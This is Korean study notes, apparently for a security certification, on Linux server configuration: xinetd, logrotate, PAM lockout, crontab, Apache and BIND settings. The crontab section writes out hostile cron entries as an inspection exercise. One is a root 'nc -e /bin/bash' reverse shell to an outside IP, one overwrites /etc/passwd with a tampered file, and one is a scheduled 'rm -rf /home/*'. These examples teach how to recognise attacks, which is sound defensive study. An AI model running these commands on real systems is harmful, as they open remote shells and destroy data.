●xinetd
다른 데몬의 실행을 관장하는 슈퍼데몬
과거 슈퍼데몬으로 사용되었던 inetd를 대체하기 위해 등장
<xinetd.conf>
defaults
{
# disabled =
 log_type = SYSLOG daemon info                     --SYSLOG/FILE : 로그기록을 syslog에 위임할지, 별도 파일로 지정할지 선택 FILE /var/logs/xinet.log
 log_on_failure = HOST                             --HOST,USERID,ATTEMPT : 접속 실패시 기록될 속성값
 log_on_success = PID HOST DURATION EXIT           --PID,HOST,USERID,EXIT,DURATION,TRAFFINC : 접속 성공 시 기록될 속성값을 지정
 cps = 50 10                                       -- cps [초당 요청수 50] [제한시간(초) 10] : 초당 요청수가 50 이상이면 10초간 접속 제한
 instances = 50                                    -- instances = 50 : 동시 서비스할 수 있는 최대 개수를 지정
 per_source = 10                                   -- per_source = 10 : 같은 IP주소로 접속할 수 있는 서비스 수를 지정
 v6only = no
 groups = yes
 umask = 002
}
+
 enabled telnet ftp : 사용가능한 항목을 설정(disabled항목에서 yes라고 설정되어 있어도 허용)
 no_access : 서비스를 이용할 수 없는 원격 호스트의 주소를 지정
 access_times : 지정된 시간에만 서비스를 이용할 수 있게 함
 nice : 서버의 우선순위 지정 -20~19 사이의 정수

●logrotate.conf(/etc/logrotate.conf)
시스템에서 사용하는 로그들이 무한정 쌓이지 않도록 순환 시키는 기능을 하는 설정 파일

wtmp로그에 대해 로그파일을 압축하고 주 단위로 새로 생성하고자 할 때>
compress
/var/log/wtmp {
   weekly
   create 0664 root utmp
       minsize 1M
   rotate 1
}

●login.defs(/etc/login.defs)
각 계정의 UID,GID,패스워드 정책 등을 설정할 수 있는 config 파일

●PAM(Pluggable Authentication Module) (/etc/pam.d/system-auth)
리눅스 계정 관리 모듈(계정 임계값 설정)
리눅스에서 플러그인 방식으로 적용할 수 있는 인증 모듈
인증 모듈을 별도로 개발하지 않고 공유 라이브러리 형태로 적용
관리자가 인증을 중앙에서 통제
<계정관리 구성요소> system-auth
deny=n --5회 로그인 실패시 접근차단
unlock_time=n --계정잠금 후 n초후 잠금해제
no_magic_root --root로부터의 접근을 거부
reset --인증에 성공할 경우 카운트를 0으로 초기화
<동작순서>
사용자나 프로세스가 Application의 접근(access)를 요청
해당 Application의 PAM설정 파일을 확인
스택의 PAM모듈이 리스트상의 순서대로 호출
PAM모듈은 성공 또는 실패 상태를 반환(Return)
스택은 계속해서 순서대로 확인되며, 실패상태를 반환한다해서 중단되지 않음
모든 PAM모듈의 상태 결과가 종합되어 전체 인증과정의 성공 또는 실패상태를 반환



●crontab
리눅스에서 정해진 시간에 작업이 실행되도록 스케줄링하는 유틸리티 프로그램
crontab -l --현재 스케줄링 되어 있는 작업 내용 보기
crontab -u sis -e --sis계정의 crontab 편집
0 2 * * 0 rm -rf /home/* --매주 일요일 새벽2시에 rm -rf명령을 이용하여 /home디렉터리 하위 모든 파일과 디렉터리를 삭제하는 crontab스케줄
//분(0-59) 시(0-23) 일(1-31) 월(1-12) 요일(0-6) 작업내용

웹서버 점검 중 cron에 새로운 작업이 등록된 것을 확인. root권한으로 실행될 경우 발생할 수 있는 위험?
0 0 6 * * root /bin/cp /tmp/passwd1 /etc/passwd
0 0 12 * * root /usr/bin/nc 10.10.10.10 80 -e /bin/bash
-임의로 조작된 passwd파일이 원래 passwd파일을 덮어씀
-10.10.10.10 호스트에 80포트로 연결한다. reverse shell(리버스쉘:내부망에서 외부해커에게 연결)의 위험이 있음

●/proc
리눅스 운영체제에서 현재 실행되고 있는 프로세스 정보를 기록하고 있는 디렉터리
/(root디렉터리) 바로 아래에 있음
일종의 가상 파일시스템으로 동작중인 프로세스의 상태정보,하드웨어정보,시스템정보 등을 알 수 있음
/proc엔 현재 실행중인 PID와 같은 이름의 폴더들이 생성됨
ps라는 명령어를 통해 이 폴더의 내용을 조회해서 보여줌

●/httpd.conf(/etc/conf/httpd/httpd.conf)(/[Apache_home]/conf/httpd.conf)
리눅스 Apache웹서버의 메인 설정파일
(기본설정)
Listen 1120 : 사용할 포트를 지정
ServerName webadmin.example.com:1120: 서버의 도메인을 입력
DocumentRoot "/var/www/html/webadmin": 웹 문서가 위치하는 디렉터리를 지정
ServerAdmin webadmin@example.com : 서버 관리자 이메일을 입력
Directoryindex index.php index.html index.htm: 클라이언트가 디렉터리를 요청할 때 먼저 읽히는 파일들을 지정
(접근제어)
<Directory "/www/ihd/admin">
 Order Deny,Allow             -- 화이트리스트(Deny와 Allow 순서를 정함)/블랙리스트(Allow,Deny)
 Deny from All                -- 최종적으로 읽히는 정책이 동작
 Allow from 192.168.2.0/24    -- 기본적으로 다 막고, 192.168.2 대역만 오픈
</Directory>
(접속유지)
KeepAlive On             
MaxKeepAliveRequests 100   : 클라이언트와 서버프로세스 간에 연결을 지속시키는 동안에 허용할 최대 요청 건수를 지정(요청초과시 연결종료)
KeepAliveTimeout 100       : 언제까지 접속을 유지할지(초단위)
-HTTP는 기본적으로 stateless프로토콜로, 페이지를 로드할 때마다 새로 접속을 수립
-KeepAlive는 이러한 특성 때문에 발생하는 부하와 속도저하를 줄이고자 일정시간동안 접속유지
-KeepAlive를 사용하면 더 빠르지만, 동시접속량은 줄어들 수 있음
(기타)
LimitRequestBody : 전송가능한 최대사이즈를 제한
indexes : 디렉터리 검색 기능 제거(Otions지시자 - indexes 옵션 제거 후 저장)
<Directory />
Options indexes followsymlinks )
AllowOverride None
Order allow, deny
Allow from all
</Directory>

●/named.conf(/var/named)
리눅스 DNS서버 프로그램인 bind(데몬명 named) 메인 설정파일
글로벌 설정은 named.conf에서 하고 세부설정은 각 도메인별 zone파일에서 함
options{
directory "/var/named";      -- zone파일이 위치하는 디렉터리명
forwarders {8.8.8.8;};       -- 도메인에 대한 질의를 다른 서버로 넘김 {DNS주소; DNS주소; ...;};
forward only;                -- only:다른서버가 응답없을 경우 자신도 응답없음 / first:다른서버에서 응답없으면 자신이 응답     
datasize 1024M;              -- 캐시메모리 최대용량을 제한
allow-query {192.168.10.1/24;};  --네임서버에 질의할 수 있는 호스트를 지정
}
>>서버로 들어온 도메인 질의요청은 8.8.8.8 IP주소를 가진 호스트로 넘기고, 해당서버에서 응답이 없어도 질의에 응답하지 않는다
>>DNS관련정보 캐싱을 하는데 사용하는 메모리를 1024M로 제한한다
>>네임서버에 질의할 수 있는 호스트를 192.168.64.0 네트워크 주소대역에 속한 호스트만 질의할 수 있게 설정한다







